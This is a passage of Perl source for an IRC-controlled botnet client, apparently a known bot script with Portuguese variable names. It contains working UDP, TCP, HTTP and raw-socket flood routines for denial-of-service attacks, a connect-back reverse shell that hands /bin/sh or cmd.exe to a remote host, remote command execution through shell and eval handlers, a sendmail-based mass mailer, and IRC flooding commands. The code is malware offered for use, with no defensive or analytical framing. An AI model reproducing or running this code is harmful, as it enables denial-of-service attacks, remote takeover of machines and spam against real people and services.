    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-2 DDOS] 9,2Attacking 8".$1." 9,1with 8".$2." 9,1Kb Packets for 8".$3." 9,1seconds. ");
    my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
    $dtime = 1 if $dtime == 0;
    my %bytes;
    $bytes{igmp} = $2 * $pacotes{igmp};
    $bytes{icmp} = $2 * $pacotes{icmp};
    $bytes{o} = $2 * $pacotes{o};
    $bytes{udp} = $2 * $pacotes{udp};
    $bytes{tcp} = $2 * $pacotes{tcp};
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-2 DDOS] 9,2Results 8".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." 9,1Kb in 8".$dtime." 9,1seconds to 8".$1."9,1. ");
}
#########################
if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    return unless $pacotes;
    socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
    my $alvo=inet_aton("$1");
    my $porta = "$2";
    my $dtime = "$3";
    my $pacote;
    my $pacotese;
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-3 DDOS] 9,2Attacking 8".$1." 9,1On Port 8".$porta." 9,1for 8".$dtime." 9,1seconds. ");
    while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
            $pacote= $rand x $rand x $rand;
            $porta = int(rand 65000) +1 if ($porta == "0");
            send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
            }
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-3 DDOS] 9,2Results 8".$pacotese." 9,1Kb in 8".$dtime." 9,1seconds to 8".$1."9,1. ");
}
#########################
if ($funcarg =~ /^udpf\s+(.*)\s+(\d+)\s+(\d+)/) {
   return unless $pacotes;
   socket(Tr0x, PF_INET, SOCK_DGRAM, 17);
   my $faixaip="$1";
   my $porta = "$2";
   my $dtime = "$3";
   sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-3 DDOS] 9,2Attacking 8".$1." 9,1On Port 8".$porta." 9,1for 8".$dtime." 9,1seconds. ");
   my $pacote;
   my $pacotes;
   my $fim = time + $dtime;
   my $pacota = 1;
   my $alvo;
   while ($pacota == "1") {
       $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
       for (my $faixa = 1; $faixa <= 255; $faixa++) {
       $alvo = inet_aton("$faixaip.$faixa");
       $pacote=$rand x $rand x $rand;
       $porta = int(rand 65000) +1 if ($porta == "0");
         send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo)) and $pacotese++ if ($pacotes == "1");
         if ($faixa >= 255) {
         $faixa = 1;
         }
      }
   }
   sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [UDP-F DDOS] 9,2Results 8 $1"."1-"."$2"."255"." 8".$pacotese." 9,1Kb in 8".$dtime."9,1. ");
}
#########################
if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [TCP DDOS] 9,2Attacking 8".$1.":".$2." 9,1for 8".$3." 9,1seconds. ");
    my $itime = time;
    my ($cur_time);
    $cur_time = time - $itime;
    while ($3>$cur_time){
          $cur_time = time - $itime;
          &tcpflooder("$1","$2","$3");
          }
    sendraw($IRC_cur_socket,"PRIVMSG $printl :0,2 [TCP DDOS] 9,2Attack ended on: 8".$1.":".$2."9,1. ");
}
#########################
if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2[HTTP DDOS] 9,2Attacking 8".$1." 9,1on port 80 for 8".$2." 9,1seconds. ");
    my $itime = time;
    my ($cur_time);
    $cur_time = time - $itime;
    while ($2>$cur_time){
          $cur_time = time - $itime;
          my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$1, PeerPort=>80);
          print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$1."\r\nConnection: Keep-Alive\r\n\r\n";
          close($socket);
          }
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [HTTP DDOS] 9,2Attacking ended on: 8".$1."9,1. ");
}
#########################
if ($funcarg =~ /^cback\s+(.*)\s+(\d+)/) {
    my $host = "$1";
    my $port = "$2";
    my $proto = getprotobyname('tcp');
    my $iaddr = inet_aton($host);
    my $paddr = sockaddr_in($port, $iaddr);
    my $shell = "/bin/sh -i";
if ($^O eq "MSWin32") {
    $shell = "cmd.exe";
}
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [ConnectBack] 9,2Connecting to 8$host:$port ");
    socket(SOCKET, PF_INET, SOCK_STREAM, $proto) or die "socket: $!";
    connect(SOCKET, $paddr) or die "connect: $!";
    open(STDIN, ">&SOCKET");
    open(STDOUT, ">&SOCKET");
    open(STDERR, ">&SOCKET");
    system("$shell");
    close(STDIN);
    close(STDOUT);
    close(STDERR);
}
#########################
if ($funcarg =~ /^mail\s+(.*)\s+(.*)\s+(.*)\s+(.*)/) {
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Mailer] 9,2Sending email to: 8$3 ");
    $subject = $1;
    $sender = $2;
    $recipient = $3;
    @corpo = $4;
    $mailtype = "content-type: text/html";
    $sendmail = '/usr/sbin/sendmail';
    open (SENDMAIL, "| $sendmail -t");
    print SENDMAIL "$mailtype\n";
    print SENDMAIL "Subject: $subject\n";
    print SENDMAIL "From: $sender\n";
    print SENDMAIL "To: $recipient\n\n";
    print SENDMAIL "@corpo\n\n";
    close (SENDMAIL);
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [Mailer] 9,2Email Sended to: 8$recipient ");
}
exit;
}
}
#########################
if ($funcarg =~ /^ctcpflood (.*)/) {
    my $target = "$1";
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [IRCFlood] 9,2CTCP Flooding: 8".$target." ");
    for (1..10) {
        sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001VERSION\001\n");
        sendraw($IRC_cur_socket, "PRIVMSG ".$target." :\001PING\001\n");
        }
}
#########################
if ($funcarg =~ /^msgflood (.*)/) {
    my $target = "$1";
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [IRCFlood] 9,2MSG Flooding: 8".$target." ");
    sendraw($IRC_cur_socket, "PRIVMSG ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
}
#########################
if ($funcarg =~ /^noticeflood (.*)/) {
    my $target = "$1";
    sendraw($IRC_cur_socket, "PRIVMSG $printl :0,2 [IRCFlood] 9,2NOTICE Flooding: 8".$target." ");
    for (1..2){
        sendraw($IRC_cur_socket, "NOTICE ".$target." :0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...8,7...9,6....0,15...1,16...2,13...3,12...4,11...5,10...6,9...7,8...");
        }
}
#########################
if ($funcarg =~ /^admin\s+(.*)\s+(.*)/) {
    @admins;
    my $command = "$1";
    my $nick2 = "$2";
        if ($command =~ /add/) {
            push(@admins, $nick2);
            sendraw($IRC_cur_socket, "PRIVMSG $printl :9,1 Added 8$nick2 9,1in the Admins List. ");
        }
        elsif ($command =~ /del/) {
            $t_adm = scalar(@admins);
            foreach my $a(@admins){
                if ($a eq $nick2) {
                    $l = $t_adm +1;
                    $a = $a[$l];
                    $#admins = $t_adm;
                }
            }
            sendraw($IRC_cur_socket, "PRIVMSG $printl :9,1 Removed 8$nick2 9,1from the Admins List. ");
        }
}
#########################
sub ircase {
my ($kem, $printl, $case) = @_;
   if ($case =~ /^join (.*)/) {
     j("$1");
   }
   elsif ($case =~ /^part (.*)/) {
     p("$1");
   }
   elsif ($case =~ /^rejoin\s+(.*)/) {
      my $chan = $1;
      if ($chan =~ /^(\d+) (.*)/) {
        for (my $ca = 1; $ca <= $1; $ca++ ) {
          p("$2");
          j("$2");
        }
      } else {
          p("$chan");
          j("$chan");
      }
   }
   elsif ($case =~ /^op/) {
      op("$printl", "$kem") if $case eq "op";
      my $oarg = substr($case, 3);
      op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^deop/) {
      deop("$printl", "$kem") if $case eq "deop";
      my $oarg = substr($case, 5);
      deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^voice/) {
      voice("$printl", "$kem") if $case eq "voice";
      $oarg = substr($case, 6);
      voice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^devoice/) {
      devoice("$printl", "$kem") if $case eq "devoice";
      $oarg = substr($case, 8);
      devoice("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
   }
   elsif ($case =~ /^msg\s+(\S+) (.*)/) {
      msg("$1", "$2");
   }
   elsif ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        msg("$2", "$3");
      }
   }
   elsif ($case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp("$1", "$2");
   }
   elsif ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my $cf = 1; $cf <= $1; $cf++) {
        ctcp("$2", "$3");
      }
   }
   elsif ($case =~ /^invite\s+(\S+) (.*)/) {
      invite("$1", "$2");
   }
   elsif ($case =~ /^newerver\s+(\S+)\s+(\S+)/) {
       conectar("$2", "$1", "6667");
   }
   elsif ($case =~ /^nick (.*)/) {
      nick("$1");
   }
   elsif ($case =~ /^rnick/) {
      rnick("$rircname[int(rand(2))]");
   }
   elsif ($case =~ /^raw (.*)/) {
      sendraw("$1");
   }
   elsif ($case =~ /^eval (.*)/) {
      eval "$1";
   }
   elsif ($case =~ /^quit/) {
     quit();
   }
}
#########################
sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
   chdir("$1") || msg("$printl", "No such file or directory");
   return;
} elsif ($pid = fork) {
   waitpid($pid, 0);
} else {
if (fork) {
   exit;
} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :9,1 $linha ");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}
#########################
sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
   $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
   socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
   socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
   socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
   socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
   return(undef) if $cp == 4;
   my $itime = time;
   my ($cur_time);
   while ( 1 ) {
     for (my $port = 1;$port <= 65000; $port++) {
     $cur_time = time - $itime;
     last if $cur_time >= $ftime;
     send(SOCK1, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{igmp}++;
     send(SOCK2, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{udp}++;
     send(SOCK3, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{icmp}++;
     send(SOCK4, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{tcp}++;
         for (my $pc = 3;$pc <= 255;$pc++) {
         next if $pc == 6;
	       $cur_time = time - $itime;
         last if $cur_time >= $ftime;
	       socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
	       send(SOCK5, $msg, 0, sockaddr_in($port, $iaddr)) and $pacotes{o}++;
         }
     }
   last if $cur_time >= $ftime;
   }
return($cur_time, %pacotes);
}
#########################
sub tcpflooder {
    my $itime = time;
    my ($cur_time);
    my ($ia,$pa,$proto,$j,$l,$t);
    $ia=inet_aton($_[0]);
    $pa=sockaddr_in($_[1],$ia);
    $ftime=$_[2];
    $proto=getprotobyname('tcp');
    $j=0;$l=0;
    $cur_time = time - $itime;
    while ($l<1000){
          $cur_time = time - $itime;
          last if $cur_time >= $ftime;
          $t="SOCK$l";
          socket($t,PF_INET,SOCK_STREAM,$proto);
          connect($t,$pa)||$j--;
          $j++;$l++;
    }
    $l=0;
    while ($l<1000){
          $cur_time = time - $itime;
          last if $cur_time >= $ftime;
          $t="SOCK$l";
          shutdown($t,2);
          $l++;
    }
}
#########################
sub msg {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :$_[1]");
}
sub ctcp {
   return unless $#_ == 1;
   sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}
sub notice {
   return unless $#_ == 1;
   sendraw("NOTICE $_[0] :$_[1]");
}
sub op {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +o $_[1]");
}
sub deop {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -o $_[1]");
}
sub voice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] +v $_[1]");
}
sub devoice {
   return unless $#_ == 1;
   sendraw("MODE $_[0] -v $_[1]");
}
sub j { &join(@_); }
sub join {
   return unless $#_ == 0;
   sendraw("JOIN $_[0]");
}
sub p { part(@_); }
sub part {sendraw("PART $_[0]");}
sub nick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub rnick {
  return unless $#_ == 0;
  sendraw("NICK $_[0]");
}
sub quit {
  sendraw("QUIT :$_[0]");
  exit;
}
sub mode { modo(@_); }
sub modo {
   return unless $#_ == 0;
   sendraw("MODE $_[0] $_[1]");
}
sub invite {
   return unless $#_ == 1;
   sendraw("INVITE $_[1] $_[0]");
}
sub topic { topico(@_); }
sub topico {
   return unless $#_ == 1;
   sendraw("TOPIC $_[0] $_[1]");
}
sub away {
  sendraw("AWAY $_[0]");
}
sub back { away(); }
}


###################
##### [ EOF ] #####
###################
